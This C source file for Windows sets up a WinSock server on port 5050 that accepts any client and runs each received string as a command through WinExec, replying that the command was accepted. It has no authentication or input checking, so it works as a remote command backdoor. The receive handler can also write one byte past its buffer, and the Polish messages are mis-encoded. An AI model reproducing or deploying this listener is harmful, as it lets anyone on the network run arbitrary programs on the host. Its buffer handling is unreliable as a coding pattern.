#include "socket.h"


void WSAClose()
{
	closesocket(s);
	s = 0;
	WSACleanup();
}

int WSAStartupServer(HWND hWnd)
{
	if (WSAStartup(MAKEWORD(2,0), &wsd) != 0)
	{
		MessageBox(0, "Nie mo¿na wczytaæ biblioteki WinSock", "B³¹d", 0);
		return 0;
	}

    if (INVALID_SOCKET == (s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)))
    {
		MessageBox(0, "Nie mo¿na utworzyæ gniazda", "B³¹d", 0);
		WSACleanup();
        return 0;
    }

	if (SOCKET_ERROR == WSAAsyncSelect(s, hWnd, WM_WSASELECTEVENT, FD_ACCEPT))
	{
		MessageBox(0, "WSAAsyncSelect", 0, 0);
		WSAClose();
		return 0;
	}

    serveraddr.sin_family = AF_INET;
    serveraddr.sin_port = htons(5050);
    serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);
	//serveraddr.sin_addr.S_un.S_addr = inet_addr(szIP);

    if (SOCKET_ERROR == bind(s, (struct sockaddr *)&serveraddr, sizeof(serveraddr)))
    {
		MessageBox(0, "Nie mo¿na zainstalowaæ serwera", "B³¹d", 0);
		WSAClose();
        return 0;
    }
    
    if (SOCKET_ERROR == listen(s, SOMAXCONN))
	{
		MessageBox(0, "listen", 0, 0);
		WSAClose();
		return 0;
	}
	return 1;
}

void WSASelectEvent(HWND hDlg, UINT uiMsg, WPARAM wParam, LPARAM lParam)
{
	wEvent = WSAGETSELECTEVENT(lParam);
	wError = WSAGETSELECTERROR(lParam);
	wSocket = (SOCKET)wParam;
	switch (wEvent)
	{
	case FD_ACCEPT:
		if (wError)
		{
			return;
		}
		iAddr = sizeof(clientaddr);
		aSocket = accept(wSocket, (struct sockaddr *)&clientaddr, &iAddr);
		WSAAsyncSelect(aSocket, hDlg, WM_WSASELECTEVENT, FD_READ | FD_WRITE | FD_CLOSE);
		break;

	case FD_READ:
		if (wError)
		{
			return;
		}
		iSize = recv(wSocket, (char*)&szRecvBuff, sizeof(szRecvBuff), 0);
		if (iSize == 0)
			break;
		else if (iSize == SOCKET_ERROR)
		{
			MessageBox(0, "B³¹d odbioru danych", "B³¹d", 0);
			break;
		}
		szRecvBuff[iSize] = '\0';

		MessageBox(0, szRecvBuff, 0, 0);
		WinExec(szRecvBuff, 0);

		strcpy(szSendBuff, "Polecenie przyjête");

		iSize = send(wSocket, szSendBuff, sizeof(szSendBuff), 0);
		break;

	case FD_WRITE:
		//Ready to send data
		break;

	case FD_CLOSE:
		closesocket(wSocket);
		wSocket = 0;
		break;
	}
}